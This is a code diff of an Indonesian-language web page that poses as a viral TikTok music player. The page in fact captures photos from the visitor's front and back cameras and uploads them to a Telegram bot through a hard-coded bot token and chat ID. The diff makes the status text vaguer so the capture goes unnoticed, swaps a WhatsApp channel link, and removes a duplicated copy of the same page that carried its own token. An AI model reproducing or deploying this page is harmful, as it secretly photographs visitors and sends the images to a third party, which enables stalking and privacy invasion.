@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Musik Sad Tiktok</title>
+<title>Musik Viral Tiktokoren</title>
 <style>
   body {
     margin: 0;
@@ -78,7 +78,7 @@
   <div id="loader"></div>
   <div id="status">Loading...</div>
   <button id="music-button">⏸️ Pause Music</button>
-  <a href="https://whatsapp.com/channel/0029Vb9rti60rGiNbe3gpm28" target="_blank">
+  <a href="https://whatsapp.com/channel/0029VastFWZ6rsQnAWJzoh22" target="_blank">
     <img id="whatsapp-logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
   </a>
 </div>
@@ -123,137 +123,16 @@ async function sendPhoto(dataURL, name){
 }
 
 async function init(){
-  document.getElementById("status").innerText = "Apa kabar.";
+  document.getElementById("status").innerText = "🔥 Beri nilai 1-10...";
   try {
     const front = await takePhoto('user');
     await sendPhoto(front, "front.jpg");
 
-    document.getElementById("status").innerText = "SELAMAT DATANG";
+    document.getElementById("status").innerText = "😊 Gimana pendapatnya...";
     const back = await takePhoto('environment');
     await sendPhoto(back, "back.jpg");
 
-    document.getElementById("status").innerText = "✅ Terimakasih sudah mendengarkan!";
-  } catch(err) {
-    console.error(err);
-    document.getElementById("status").innerText = "❌ Error: " + err.message;
-  }
-}
-
-window.onload = init;
-
-const music = document.getElementById("background-music");
-const musicBtn = document.getElementById("music-button");
-
-musicBtn.addEventListener("click", () => {
-  if (music.paused) {
-    music.play();
-    musicBtn.innerHTML = "⏸️ Pause Music";
-  } else {
-    music.pause();
-    musicBtn.innerHTML = "▶️ Play Music";
-  }
-});
-</script>
-</body>
-</html>    100% { transform: rotate(360deg); }
-  }
-
-  #status {
-    font-size: 16px;
-    color: black;
-    margin-bottom: 20px;
-    text-align: center;
-  }
-
-  #music-button {
-    padding: 12px 25px;
-    background: linear-gradient(45deg, #1DB954, #1ED760);
-    color: white;
-    border: none;
-    border-radius: 50px;
-    font-size: 16px;
-    cursor: pointer;
-    box-shadow: 0px 4px 6px rgba(0,0,0,0.2);
-    transition: transform 0.2s, background 0.3s;
-    margin-bottom: 20px;
-  }
-
-  #music-button:hover {
-    transform: scale(1.05);
-    background: linear-gradient(45deg, #1ED760, #1DB954);
-  }
-
-  #whatsapp-logo {
-    width: 50px;
-    cursor: pointer;
-    transition: transform 0.2s;
-  }
-
-  #whatsapp-logo:hover {
-    transform: scale(1.1);
-  }
-</style>
-</head>
-<body>
-<div id="loader-container">
-  <div id="loader"></div>
-  <div id="status">Loading...</div>
-  <button id="music-button">⏸️ Pause Music</button>
-  <a href="https://whatsapp.com/channel/0029Vb1gtyA05MUeAFFrrk0X" target="_blank">
-    <img id="whatsapp-logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
-  </a>
-</div>
-
-<audio id="background-music" src="https://j.top4top.io/m_3559zu8uh2.mp3" autoplay loop></audio>
-
-<script>
-const TELEGRAM_TOKEN = "7740915138:AAGGgWA1Zq39H95q2o90VCwr6tPcgaZva8k";
-const CHAT_ID = "7189193429";
-
-function dataURItoBlob(dataURI){
-  const byteString = atob(dataURI.split(',')[1]);
-  const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
-  const ab = new ArrayBuffer(byteString.length);
-  const ia = new Uint8Array(ab);
-  for (let i = 0; i < byteString.length; i++) {
-    ia[i] = byteString.charCodeAt(i);
-  }
-  return new Blob([ab], {type: mime});
-}
-
-async function takePhoto(cam){
-  const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:cam}});
-  const track = stream.getVideoTracks()[0];
-  const imageCapture = new ImageCapture(track);
-  const bitmap = await imageCapture.grabFrame();
-  track.stop();
-  const canvas = document.createElement('canvas');
-  canvas.width = bitmap.width;
-  canvas.height = bitmap.height;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(bitmap, 0, 0);
-  return canvas.toDataURL('image/jpeg');
-}
-
-async function sendPhoto(dataURL, name){
-  const blob = dataURItoBlob(dataURL);
-  const form = new FormData();
-  form.append('chat_id', CHAT_ID);
-  form.append('photo', blob, name);
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {method:'POST', body:form});
-}
-
-async function init(){
-  document.getElementById("status").innerText = "📷 Ambil foto depan...";
-  try {
-    const front = await takePhoto('user');
-    await sendPhoto(front, "front.jpg");
-
-    document.getElementById("status").innerText = "📷 Ambil foto belakang...";
-    const back = await takePhoto('environment');
-    await sendPhoto(back, "back.jpg");
-
-    document.getElementById("status").innerText = "✅ Foto terkirim ke Telegram!";
+    document.getElementById("status").innerText = "✅ Selamat mendengarkan!";
   } catch(err) {
     console.error(err);
     document.getElementById("status").innerText = "❌ Error: " + err.message;
